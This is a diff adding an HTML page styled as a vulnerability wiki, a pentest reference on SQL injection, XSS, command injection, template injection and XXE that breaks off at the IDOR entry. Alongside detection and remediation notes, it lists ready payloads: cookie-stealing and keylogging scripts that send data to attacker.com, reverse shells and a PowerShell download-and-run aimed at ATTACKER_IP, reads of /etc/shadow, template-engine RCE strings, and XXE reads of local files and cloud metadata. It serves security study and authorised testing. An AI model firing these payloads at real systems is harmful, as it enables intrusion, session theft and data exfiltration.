@@ -1,0 +1,1697 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vulnerability Database — Wiki</title>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Source+Sans+3:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#fff;--sf:#f8f9fa;--bd:#a2a9b1;--ac:#0645ad;--ac2:#0b0080;--vi:#3366cc;--green:#006644;--red:#cc0000;--orange:#e67e22;--yellow:#b8860b;--tx:#202122;--td:#54595d;--code-bg:#f0f3f8;--code-bd:#c8ccd1;--highlight:#fffde7}
+body{font-family:'Source Sans 3','Source Sans Pro',sans-serif;background:var(--bg);color:var(--tx);line-height:1.7}
+a{color:var(--ac);text-decoration:none}a:hover{text-decoration:underline}
+
+/* WIKI HEADER */
+.wiki-header{background:var(--sf);border-bottom:1px solid var(--bd);padding:10px 20px;display:flex;align-items:center;gap:16px}
+.wiki-logo{font-size:1.6em;font-weight:700;color:var(--tx);font-family:'Fira Code',monospace}
+.wiki-logo span{color:var(--ac)}
+.wiki-search{margin-left:auto}
+.wiki-search input{padding:6px 12px;border:1px solid var(--bd);border-radius:2px;font-size:.9em;width:280px;font-family:inherit}
+.wiki-search input:focus{outline:none;border-color:var(--ac)}
+
+/* LAYOUT */
+.wiki-layout{display:flex;max-width:1200px;margin:0 auto;min-height:calc(100vh - 50px)}
+.wiki-sidebar{width:220px;min-width:220px;background:var(--sf);border-right:1px solid var(--bd);padding:16px 12px;position:sticky;top:0;height:100vh;overflow-y:auto;font-size:.88em}
+.wiki-sidebar h3{color:var(--td);font-size:.82em;text-transform:uppercase;letter-spacing:.5px;margin:12px 0 6px;padding-bottom:4px;border-bottom:1px solid var(--bd)}
+.wiki-sidebar a{display:block;padding:3px 8px;color:var(--ac);border-radius:3px;font-size:.92em}
+.wiki-sidebar a:hover{background:rgba(6,69,173,.06);text-decoration:none}
+.wiki-sidebar a.active{background:rgba(6,69,173,.1);font-weight:600}
+.wiki-content{flex:1;padding:24px 32px;max-width:900px}
+
+/* TYPOGRAPHY */
+.page-title{font-size:1.9em;font-weight:700;border-bottom:1px solid var(--bd);padding-bottom:6px;margin-bottom:16px;font-family:'Source Sans 3',sans-serif}
+.page-tagline{color:var(--td);font-size:.95em;margin-bottom:20px;font-style:italic}
+.section-heading{font-size:1.4em;font-weight:700;border-bottom:1px solid var(--bd);padding-bottom:4px;margin:28px 0 12px;color:var(--tx)}
+.sub-heading{font-size:1.15em;font-weight:700;margin:20px 0 8px;color:var(--tx)}
+
+/* INFOBOX */
+.infobox{float:right;width:280px;border:1px solid var(--bd);background:var(--sf);margin:0 0 16px 20px;font-size:.9em;border-collapse:collapse}
+.infobox-title{background:var(--ac);color:#fff;padding:8px 12px;font-weight:700;text-align:center;font-size:1.05em}
+.infobox td{padding:5px 10px;border-top:1px solid var(--bd);vertical-align:top}
+.infobox td:first-child{font-weight:600;width:40%;color:var(--td)}
+.infobox .severity-critical{color:#fff;background:#cc0000;padding:2px 8px;border-radius:3px;font-weight:700;font-size:.85em}
+.infobox .severity-high{color:#fff;background:#e67e22;padding:2px 8px;border-radius:3px;font-weight:700;font-size:.85em}
+.infobox .severity-medium{color:#fff;background:#b8860b;padding:2px 8px;border-radius:3px;font-weight:700;font-size:.85em}
+.infobox .severity-low{color:#fff;background:#006644;padding:2px 8px;border-radius:3px;font-weight:700;font-size:.85em}
+
+/* TABLE */
+.wiki-table{width:100%;border-collapse:collapse;margin:12px 0;font-size:.92em}
+.wiki-table th{background:var(--sf);border:1px solid var(--bd);padding:6px 10px;text-align:left;font-weight:600}
+.wiki-table td{border:1px solid var(--bd);padding:6px 10px}
+.wiki-table tr:hover td{background:var(--highlight)}
+
+/* CODE */
+code{font-family:'Fira Code',monospace;background:var(--code-bg);padding:1px 5px;border:1px solid var(--code-bd);border-radius:2px;font-size:.88em}
+pre{background:var(--code-bg);border:1px solid var(--code-bd);border-radius:3px;padding:14px;overflow-x:auto;font-family:'Fira Code',monospace;font-size:.84em;line-height:1.6;margin:10px 0}
+pre code{background:none;border:none;padding:0}
+
+/* BOXES */
+.hack-box{border:1px solid var(--bd);background:var(--sf);padding:14px 18px;margin:12px 0;border-radius:3px}
+.hack-box-title{font-weight:700;margin-bottom:6px;color:var(--tx)}
+.danger-box{border-left:4px solid var(--red);background:#fff5f5;padding:12px 16px;margin:12px 0}
+.danger-box strong{color:var(--red)}
+.tip-box{border-left:4px solid var(--green);background:#f0fff4;padding:12px 16px;margin:12px 0}
+.tip-box strong{color:var(--green)}
+.warn-box{border-left:4px solid var(--orange);background:#fffbf0;padding:12px 16px;margin:12px 0}
+.warn-box strong{color:var(--orange)}
+
+/* VULN SECTION */
+.vuln-section{margin-bottom:40px;padding-bottom:20px;border-bottom:2px solid var(--bd)}
+.vuln-section:last-child{border-bottom:none}
+.vuln-id{font-family:'Fira Code',monospace;color:var(--td);font-size:.85em}
+
+/* TOC */
+.toc-box{border:1px solid var(--bd);background:var(--sf);padding:14px 18px;margin:16px 0;display:inline-block;min-width:300px}
+.toc-box .toc-title{font-weight:700;margin-bottom:8px}
+.toc-box ol{padding-left:22px;font-size:.92em}
+.toc-box li{margin:3px 0}
+.toc-box a{color:var(--ac)}
+
+/* FOOTER */
+.wiki-footer{border-top:1px solid var(--bd);padding:16px 20px;text-align:center;color:var(--td);font-size:.82em;background:var(--sf)}
+
+/* RESPONSIVE */
+@media(max-width:900px){.wiki-sidebar{display:none}.wiki-content{padding:16px}.infobox{float:none;width:100%;margin:0 0 16px 0}}
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<div class="wiki-header">
+<div class="wiki-logo"><span>Vuln</span>Wiki</div>
+<div style="font-size:.85em;color:var(--td)">The Vulnerability Database</div>
+<div class="wiki-search"><input type="text" id="searchInput" placeholder="Search vulnerabilities..." oninput="filterVulns()"></div>
+</div>
+
+<!-- LAYOUT -->
+<div class="wiki-layout">
+
+<!-- SIDEBAR -->
+<div class="wiki-sidebar">
+<h3>Navigation</h3>
+<a href="#top">Main Page</a>
+<a href="#about">About This Guide</a>
+
+<h3>Injection</h3>
+<a href="#sqli">SQL Injection</a>
+<a href="#xss">Cross-Site Scripting</a>
+<a href="#commandi">Command Injection</a>
+<a href="#ssti">Template Injection</a>
+<a href="#xxe">XML External Entity</a>
+
+<h3>Authentication</h3>
+<a href="#idor">IDOR</a>
+<a href="#auth">Auth Bypass</a>
+<a href="#jwt">JWT Attacks</a>
+<a href="#session">Session Fixation</a>
+
+<h3>Access Control</h3>
+<a href="#csrf">CSRF</a>
+<a href="#privesc">Privilege Escalation</a>
+<a href="#rbac">RBAC Bypass</a>
+
+<h3>Server-Side</h3>
+<a href="#ssrf">SSRF</a>
+<a href="#lfi">File Inclusion</a>
+<a href="#desync">Request Smuggling</a>
+<a href="#deserial">Deserialization</a>
+
+<h3>Client-Side</h3>
+<a href="#openredirect">Open Redirect</a>
+<a href="#cors">CORS Misconfiguration</a>
+<a href="#clickjack">Clickjacking</a>
+
+<h3>Information</h3>
+<a href="#infodisc">Info Disclosure</a>
+<a href="#headers">Missing Headers</a>
+
+<h3>Cloud</h3>
+<a href="#s3bucket">S3 Buckets</a>
+<a href="#metadata">Cloud Metadata</a>
+<a href="#apileak">API Key Leaks</a>
+<a href="#takeover">Subdomain Takeover</a>
+<a href="#lambda">Lambda / Serverless</a>
+
+<h3>Network</h3>
+<a href="#ssl">SSL/TLS Issues</a>
+<a href="#dns">DNS Rebinding</a>
+</div>
+
+<!-- CONTENT -->
+<div class="wiki-content" id="top">
+
+<h1 class="page-title">Vulnerability Database</h1>
+<p class="page-tagline">A comprehensive reference for web application security vulnerabilities — identification, exploitation, and remediation.</p>
+
+<div class="toc-box">
+<div class="toc-title">Contents</div>
+<ol>
+<li><a href="#sqli">SQL Injection (SQLi)</a></li>
+<li><a href="#xss">Cross-Site Scripting (XSS)</a></li>
+<li><a href="#commandi">Command Injection</a></li>
+<li><a href="#ssti">Server-Side Template Injection</a></li>
+<li><a href="#xxe">XML External Entity (XXE)</a></li>
+<li><a href="#idor">Insecure Direct Object Reference</a></li>
+<li><a href="#auth">Authentication Bypass</a></li>
+<li><a href="#jwt">JWT Attacks</a></li>
+<li><a href="#session">Session Fixation</a></li>
+<li><a href="#csrf">Cross-Site Request Forgery</a></li>
+<li><a href="#privesc">Privilege Escalation</a></li>
+<li><a href="#rbac">RBAC Bypass</a></li>
+<li><a href="#ssrf">Server-Side Request Forgery</a></li>
+<li><a href="#lfi">Local/Remote File Inclusion</a></li>
+<li><a href="#desync">HTTP Request Smuggling</a></li>
+<li><a href="#deserial">Insecure Deserialization</a></li>
+<li><a href="#openredirect">Open Redirect</a></li>
+<li><a href="#cors">CORS Misconfiguration</a></li>
+<li><a href="#clickjack">Clickjacking</a></li>
+<li><a href="#infodisc">Information Disclosure</a></li>
+<li><a href="#headers">Missing Security Headers</a></li>
+<li><a href="#s3bucket">Open S3 Buckets</a></li>
+<li><a href="#metadata">Cloud Metadata Exploitation</a></li>
+<li><a href="#apileak">Exposed API Keys</a></li>
+<li><a href="#takeover">Subdomain Takeover</a></li>
+<li><a href="#lambda">Lambda / Serverless Vulnerabilities</a></li>
+<li><a href="#ssl">SSL/TLS Issues</a></li>
+<li><a href="#dns">DNS Rebinding</a></li>
+</ol>
+</div>
+
+<!-- ABOUT -->
+<div class="vuln-section" id="about">
+<h2 class="section-heading">About This Database</h2>
+<p>This is a Wikipedia-style reference for web application security vulnerabilities. Each entry includes a technical description, detection methodology, exploitation payloads, and remediation guidance.</p>
+<div class="hack-box">
+<div class="hack-box-title">⚠️ Legal Notice</div>
+<p>Only test on systems you own or have explicit written authorization to test. Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA) and equivalent laws worldwide. Bug bounty programs provide authorized testing scope — always read the rules of engagement.</p>
+</div>
+</div>
+
+</div><!-- end wiki-content -->
+</div><!-- end wiki-layout -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 1: SQL INJECTION -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="sqli" data-search="sql injection sqli database login search query blind union error time-based">
+<div class="vuln-id">CWE-89 · CVSS 9.8 Critical</div>
+<h2 class="section-heading">1. SQL Injection (SQLi)</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>OWASP Category</td><td>A03:2021 — Injection</td></tr>
+<tr><td>CWE</td><td>CWE-89: Improper Neutralization of Special Elements used in an SQL Command</td></tr>
+<tr><td>Severity</td><td><span class="severity-critical">CRITICAL</span></td></tr>
+<tr><td>Impact</td><td>Data theft, data modification, authentication bypass, remote code execution</td></tr>
+<tr><td>Prevalence</td><td>Very Common — still in OWASP Top 10</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>SQL Injection occurs when user-supplied input is concatenated directly into SQL queries without proper sanitization or parameterization. An attacker can inject malicious SQL syntax to alter the query logic, potentially reading, modifying, or deleting database contents. The vulnerability exists because the application fails to separate code (SQL commands) from data (user input).</p>
+
+<p>There are three primary variants:</p>
+<ul>
+<li><strong>In-band SQLi (Classic)</strong> — Results are returned directly in the application response. Includes <em>Union-based</em> (using UNION SELECT to combine results) and <em>Error-based</em> (extracting data from database error messages).</li>
+<li><strong>Inferential SQLi (Blind)</strong> — No direct output. The attacker infers data by observing application behavior differences. <em>Boolean-based</em> sends true/false conditions and compares responses. <em>Time-based</em> uses <code>SLEEP()</code> or <code>BENCHMARK()</code> to measure response delays.</li>
+<li><strong>Out-of-band SQLi</strong> — Data is exfiltrated via DNS or HTTP requests from the database server. Used when in-band channels are unreliable.</li>
+</ul>
+
+<h3 class="sub-heading">How to Find</h3>
+<div class="hack-box">
+<div class="hack-box-title">Detection Methodology</div>
+<ol>
+<li><strong>Identify all input points</strong> — URL parameters, form fields, HTTP headers (Referer, User-Agent, X-Forwarded-For), cookie values, JSON/XML body fields.</li>
+<li><strong>Test with single quote</strong> — Append <code>'</code> to each input. A database error, 500 status, or changed response indicates potential SQLi.</li>
+<li><strong>Test with OR conditions</strong> — Input <code>' OR '1'='1</code> or <code>1 OR 1=1</code>. If the response changes (more data, login bypass), investigate further.</li>
+<li><strong>Test with AND conditions</strong> — Input <code>' AND '1'='1</code> (should behave normally) vs <code>' AND '1'='2</code> (should behave differently). If responses differ, SQLi is confirmed.</li>
+<li><strong>Use sqlmap</strong> — Automate detection: <code>sqlmap -u "https://target.com/page?id=1" --batch</code></li>
+</ol>
+</div>
+
+<h3 class="sub-heading">When It Occurs</h3>
+<ul>
+<li>Login forms where username/password are concatenated into queries</li>
+<li>Search functionality with unsanitized input</li>
+<li>URL parameters like <code>?id=</code>, <code>?page=</code>, <code>?sort=</code></li>
+<li>ORDER BY, LIMIT, or other SQL clauses in parameters</li>
+<li>Second-order SQLi — input is stored safely but rendered unsafely later</li>
+</ul>
+
+<h3 class="sub-heading">Exploitation Payloads</h3>
+
+<div class="sub-heading" style="font-size:1em">Detection</div>
+<pre><code>' 
+"
+')
+")
+'--
+"--
+#--
+/*</code></pre>
+
+<div class="sub-heading" style="font-size:1em">Union-Based</div>
+<pre><code>-- Find column count
+' ORDER BY 1-- 
+' ORDER BY 2--
+... (keep increasing until error)
+
+-- Null injection to find column types
+' UNION SELECT NULL,NULL,NULL-- 
+' UNION SELECT NULL,NULL,NULL,NULL-- 
+
+-- Extract data
+' UNION SELECT username,password,NULL FROM users-- 
+' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- 
+' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- </code></pre>
+
+<div class="sub-heading" style="font-size:1em">Error-Based</div>
+<pre><code>' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- 
+' AND extractvalue(1,concat(0x7e,(SELECT version())))-- 
+' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- </code></pre>
+
+<div class="sub-heading" style="font-size:1em">Blind (Boolean)</div>
+<pre><code>-- Test if blind SQLi exists
+' AND 1=1-- (true condition, normal response)
+' AND 1=2-- (false condition, different response)
+
+-- Extract data bit by bit
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'-- </code></pre>
+
+<div class="sub-heading" style="font-size:1em">Blind (Time-Based)</div>
+<pre><code>' AND IF(1=1,SLEEP(5),0)-- 
+' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)-- 
+'; WAITFOR DELAY '0:0:5'--  (MSSQL)
+' AND pg_sleep(5)--  (PostgreSQL)</code></pre>
+
+<div class="tip-box"><strong>Tools:</strong> sqlmap, Burp Suite Pro, jSQL Injection, HAvij</div>
+
+<h3 class="sub-heading">Remediation</h3>
+<ul>
+<li><strong>Parameterized queries (Prepared Statements)</strong> — Never concatenate user input into SQL. Use <code>PreparedStatement</code> in Java, <code>cursor.execute(sql, params)</code> in Python, etc.</li>
+<li><strong>Stored Procedures</strong> — Pre-compiled SQL with defined parameters</li>
+<li><strong>Input Validation</strong> — Whitelist acceptable input patterns</li>
+<li><strong>Least Privilege</strong> — Database accounts should have minimal required permissions</li>
+<li><strong>WAF</strong> — Web Application Firewalls can filter common SQLi patterns</li>
+</ul>
+</div>
+
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 2: XSS -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="xss" data-search="xss cross-site scripting reflected stored dom script injection cookie theft session hijacking">
+<div class="vuln-id">CWE-79 · CVSS 6.1 Medium → 8.1 High</div>
+<h2 class="section-heading">2. Cross-Site Scripting (XSS)</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>OWASP Category</td><td>A03:2021 — Injection</td></tr>
+<tr><td>CWE</td><td>CWE-79: Improper Neutralization of Input During Web Page Generation</td></tr>
+<tr><td>Severity</td><td><span class="severity-high">HIGH</span> (varies by context)</td></tr>
+<tr><td>Impact</td><td>Session hijacking, credential theft, phishing, defacement, keylogging</td></tr>
+<tr><td>Prevalence</td><td>Extremely Common</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>Cross-Site Scripting (XSS) enables an attacker to inject client-side scripts (typically JavaScript) into web pages viewed by other users. The vulnerability arises when an application includes untrusted data in its output HTML without proper encoding or sanitization. XSS is the most prevalent web vulnerability and has three distinct variants:</p>
+<ul>
+<li><strong>Reflected XSS</strong> — The injected script is part of the request (URL parameter, form field) and is immediately reflected in the server's response. Requires social engineering to trick a victim into clicking a crafted URL.</li>
+<li><strong>Stored XSS</strong> — The injected script is permanently stored on the target server (database, message forum, comment field). Every user who views the affected page executes the script. Most dangerous variant.</li>
+<li><strong>DOM-based XSS</strong> — The vulnerability exists entirely in client-side JavaScript. The server response is safe, but the client-side script processes unsanitized input and writes it to the DOM. Example: <code>document.getElementById('output').innerHTML = location.hash</code>.</li>
+</ul>
+
+<h3 class="sub-heading">How to Find</h3>
+<div class="hack-box">
+<div class="hack-box-title">Detection Methodology</div>
+<ol>
+<li><strong>Identify input reflection</strong> — Submit a unique marker (e.g., <code>xyz123test</code>) in every input. Check if it appears in the response HTML, JavaScript, or attributes.</li>
+<li><strong>Test context</strong> — Determine where your input lands: HTML body, HTML attribute, JavaScript string, CSS, URL. Each context requires different payloads.</li>
+<li><strong>Test filter bypasses</strong> — If <code>&lt;script&gt;</code> is blocked, try event handlers (<code>onerror</code>, <code>onload</code>, <code>onfocus</code>), alternative tags (<code>&lt;svg&gt;</code>, <code>&lt;img&gt;</code>, <code>&lt;details&gt;</code>), or encoding bypasses.</li>
+<li><strong>Check for DOM sources/sinks</strong> — Use browser DevTools to trace <code>document.location</code>, <code>document.referrer</code>, <code>window.name</code> to dangerous sinks like <code>innerHTML</code>, <code>eval()</code>, <code>document.write()</code>.</li>
+</ol>
+</div>
+
+<h3 class="sub-heading">When It Occurs</h3>
+<ul>
+<li>Search terms reflected in results page</li>
+<li>User profiles (name, bio, website URL rendered as HTML)</li>
+<li>Comment sections, forums, message boards</li>
+<li>Error pages that display the requested URL</li>
+<li>PDF generators that render HTML</li>
+<li>Any <code>innerHTML</code>, <code>document.write()</code>, <code>eval()</code> with user input</li>
+</ul>
+
+<h3 class="sub-heading">Exploitation Payloads</h3>
+
+<div class="sub-heading" style="font-size:1em">Basic</div>
+<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
+
+<div class="sub-heading" style="font-size:1em">Tag-Based Bypass</div>
+<pre><code>&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;input onfocus=alert(1) autofocus&gt;
+&lt;marquee onstart=alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;video src=x onerror=alert(1)&gt;
+&lt;audio src=x onerror=alert(1)&gt;</code></pre>
+
+<div class="sub-heading" style="font-size:1em">Attribute Escape</div>
+<pre><code>" onfocus=alert(1) autofocus="
+' onmouseover=alert(1) '
+" onclick=alert(1) "</code></pre>
+
+<div class="sub-heading" style="font-size:1em">JavaScript Context</div>
+<pre><code>';alert(1);//
+"-alert(1)-"
+\'-alert(1)//
+</code></pre>
+
+<div class="sub-heading" style="font-size:1em">Cookie Stealer</div>
+<pre><code>&lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script&gt;
+&lt;script&gt;new Image().src='https://attacker.com/steal?c='+document.cookie&lt;/script&gt;
+&lt;script&gt;location='https://attacker.com/steal?c='+document.cookie&lt;/script&gt;</code></pre>
+
+<div class="sub-heading" style="font-size:1em">Keylogger</div>
+<pre><code>&lt;script&gt;document.onkeypress=function(e){fetch('https://attacker.com/log?key='+e.key)}&lt;/script&gt;</code></pre>
+
+<div class="tip-box"><strong>Tools:</strong> Dalfox, XSStrike, Burp Suite, browser DevTools</div>
+
+<h3 class="sub-heading">Remediation</h3>
+<ul>
+<li><strong>Output Encoding</strong> — Encode all user input before rendering: HTML entities (<code>&amp;lt;</code>), JavaScript encoding, URL encoding, CSS encoding</li>
+<li><strong>Content Security Policy (CSP)</strong> — Restrict which scripts can execute</li>
+<li><strong>HTTPOnly Cookies</strong> — Prevent JavaScript access to session cookies</li>
+<li><strong>Input Validation</strong> — Whitelist expected input patterns</li>
+<li><strong>DOMPurify</strong> — Sanitize HTML for client-side rendering</li>
+</ul>
+</div>
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 3: COMMAND INJECTION -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="commandi" data-search="command injection os command rce remote code execution shell exec system popen">
+<div class="vuln-id">CWE-78 · CVSS 9.8 Critical</div>
+<h2 class="section-heading">3. OS Command Injection</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>OWASP Category</td><td>A03:2021 — Injection</td></tr>
+<tr><td>CWE</td><td>CWE-78: Improper Neutralization of Special Elements used in an OS Command</td></tr>
+<tr><td>Severity</td><td><span class="severity-critical">CRITICAL</span></td></tr>
+<tr><td>Impact</td><td>Remote code execution, full server compromise, data exfiltration, lateral movement</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>OS Command Injection occurs when an application passes unsafe user-supplied data to a system shell. Unlike SQL injection (which targets databases), command injection targets the operating system itself. If exploited, an attacker can execute arbitrary commands on the server with the privileges of the web application — potentially reading files, creating accounts, establishing reverse shells, or pivoting to internal networks.</p>
+
+<h3 class="sub-heading">How to Find</h3>
+<div class="hack-box">
+<div class="hack-box-title">Detection Methodology</div>
+<ol>
+<li><strong>Identify command-executing features</strong> — ping diagnostics, DNS lookup, file conversion, image processing, PDF generation, network tools.</li>
+<li><strong>Test with command separators</strong> — inject <code>;</code>, <code>|</code>, <code>&amp;&amp;</code>, <code>||</code>, <code>`</code>, <code>$()</code> followed by a benign command.</li>
+<li><strong>Verify with time delay</strong> — inject <code>sleep 5</code> or <code>ping -c 5 127.0.0.1</code>. If response takes 5 seconds, command injection is confirmed.</li>
+<li><strong>Use out-of-band detection</strong> — inject <code>curl https://attacker.com</code> or <code>nslookup attacker.com</code> and check your server.</li>
+</ol>
+</div>
+
+<h3 class="sub-heading">When It Occurs</h3>
+<ul>
+<li>Ping/diagnostic tools in web interfaces</li>
+<li>DNS lookup features</li>
+<li>File format conversion (ImageMagick, ffmpeg)</li>
+<li>Network scanning tools</li>
+<li>Barcode/QR code generators</li>
+<li>Any use of <code>system()</code>, <code>exec()</code>, <code>passthru()</code>, <code>popen()</code>, <code>subprocess.Popen()</code></li>
+</ul>
+
+<h3 class="sub-heading">Exploitation Payloads</h3>
+<pre><code>-- Basic separators
+; whoami
+| whoami
+|| whoami
+&& whoami
+`whoami`
+$(whoami)
+
+-- Data exfiltration
+; cat /etc/passwd
+| cat /etc/passwd
+; grep -i password /etc/shadow
+
+-- Reverse shell (Linux)
+; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+| python -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+| nc -e /bin/bash ATTACKER_IP 4444
+
+-- Windows
+| whoami
+| type C:\Windows\System32\drivers\etc\hosts
+| powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')"
+
+-- Blind command injection
+; sleep 5
+| ping -c 5 127.0.0.1
+; nslookup attacker.com</code></pre>
+
+<div class="tip-box"><strong>Tools:</strong> Commix (automated command injection), Burp Suite, manual testing</div>
+
+<h3 class="sub-heading">Remediation</h3>
+<ul>
+<li><strong>Avoid shell execution entirely</strong> — Use language-native APIs instead of shell commands</li>
+<li><strong>Input validation</strong> — Whitelist allowed characters (alphanumeric only)</li>
+<li><strong>Escape special characters</strong> — Use <code>shlex.quote()</code> (Python) or equivalent</li>
+<li><strong>Least privilege</strong> — Run web apps with minimal OS permissions</li>
+</ul>
+</div>
+
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 4: SSTI -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="ssti" data-search="ssti server side template injection twig jinja2 freemarker velocity">
+<div class="vuln-id">CWE-1336 · CVSS 9.8 Critical</div>
+<h2 class="section-heading">4. Server-Side Template Injection (SSTI)</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine</td></tr>
+<tr><td>Severity</td><td><span class="severity-critical">CRITICAL</span></td></tr>
+<tr><td>Impact</td><td>Remote code execution, data exfiltration, server compromise</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>SSTI occurs when user input is embedded into a server-side template without proper sanitization. Template engines (Jinja2, Twig, Freemarker, Velocity, Pug, Slim) process templates to generate HTML. If user input is placed directly into a template, an attacker can escape the template context and execute arbitrary code on the server.</p>
+
+<h3 class="sub-heading">How to Find</h3>
+<div class="hack-box">
+<div class="hack-box-title">Detection</div>
+<ol>
+<li><strong>Math test</strong> — Input <code>{{7*7}}</code> in every parameter. If the response contains <code>49</code>, SSTI exists.</li>
+<li><strong>Try different syntax</strong> — <code>${7*7}</code>, <code>&lt;%= 7*7 %&gt;</code>, <code>#set($x=7*7)$x</code></li>
+<li><strong>Identify template engine</strong> — Different engines use different syntax. Jinja2/Twig use <code>{{ }}</code>, Freemarker uses <code>${ }</code>, Velocity uses <code>#set</code>.</li>
+<li><strong>Confirm RCE</strong> — Once confirmed, attempt OS command execution through the template.</li>
+</ol>
+</div>
+
+<h3 class="sub-heading">Exploitation Payloads</h3>
+<pre><code>-- Detection
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+
+-- Jinja2 (Python/Flask) RCE
+{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
+{{request.application.__self__._get_data_for_json.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
+
+-- Twig (PHP) RCE
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+-- Freemarker (Java) RCE
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
+
+-- Slim (Ruby) RCE
+&lt;%= system("whoami") %&gt;</code></pre>
+
+<div class="tip-box"><strong>Tools:</strong> Tplmap (automated SSTI exploitation)</div>
+</div>
+
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 5: XXE -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="xxe" data-search="xxe xml external entity injection parsing file read ssrf">
+<div class="vuln-id">CWE-611 · CVSS 9.1 Critical</div>
+<h2 class="section-heading">5. XML External Entity (XXE)</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-611: Improper Restriction of XML External Entity Reference</td></tr>
+<tr><td>Severity</td><td><span class="severity-critical">CRITICAL</span></td></tr>
+<tr><td>Impact</td><td>File read, SSRF, denial of service, remote code execution</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>XXE vulnerabilities occur when XML input containing a reference to an external entity is processed by a weakly configured XML parser. The parser resolves the external entity, which can point to internal files (<code>file:///etc/passwd</code>), internal network resources, or cause denial of service via billion laughs attack.</p>
+
+<h3 class="sub-heading">How to Find</h3>
+<div class="hack-box">
+<div class="hack-box-title">Detection</div>
+<ol>
+<li><strong>Identify XML inputs</strong> — SOAP endpoints, RSS feeds, SVG uploads, XML-RPC, SAML assertions, document upload features (DOCX, XLSX, PPTX).</li>
+<li><strong>Submit test XML</strong> — Send a request with XML body containing an external entity definition.</li>
+<li><strong>Check response</strong> — If the entity's value appears in the response, XXE is confirmed.</li>
+</ol>
+</div>
+
+<h3 class="sub-heading">Exploitation Payloads</h3>
+<pre><code>-- Basic file read
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+
+-- PHP file read (with encoding)
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;
+]&gt;
+
+-- SSRF via XXE
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
+]&gt;
+
+-- Blind XXE (OOB via FTP)
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;
+  %dtd;
+]&gt;
+
+-- Denial of Service (Billion Laughs)
+&lt;!DOCTYPE lolz [
+  &lt;!ENTITY lol "lol"&gt;
+  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
+  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
+  ...
+]&gt;</code></pre>
+</div>
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 6: IDOR -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="idor" data-search="idor insecure direct object reference access other users data account profile api id">
+<div class="vuln-id">CWE-639 · CVSS 7.5 High</div>
+<h2 class="section-heading">6. Insecure Direct Object Reference (IDOR)</h2>
+
+<table class="wiki-table">
